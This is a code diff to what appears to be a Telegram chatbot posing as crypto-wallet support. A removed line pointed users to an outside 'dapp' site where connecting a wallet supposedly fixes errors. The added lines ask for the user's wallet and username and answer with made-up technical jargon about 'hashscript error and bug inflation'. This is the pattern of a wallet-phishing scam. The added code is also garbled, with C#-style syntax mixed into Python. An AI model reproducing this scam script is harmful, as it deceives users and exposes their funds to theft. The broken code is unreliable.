@@ -17,10 +17,21 @@ def start(update, context):
 
 
 def echo(update, context):
-    update.message.reply_text('Kindly navigate to https://rectification-dapp.com to reseolve issues related to that, upon connecting to the dapp platform; your errors are automatically fixed')
     update.message.reply_text('Which wallet account did you use to connect')
+    if (update.Message.ReplyToMessage.Text.Contains("your username")):
+    {
+      update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
+    }
+    else
+    {
+        return
+    }
 
-    
+Bot.SendChatAction(update.Message.Chat.Id, ChatAction.Typing);
+Bot.SendTextMessage(update.Message.Chat.Id, "Type your username, please");
+
+// Checking incoming messages for replies
+
 
 def error(update, context):
     """Log Errors caused by Updates."""
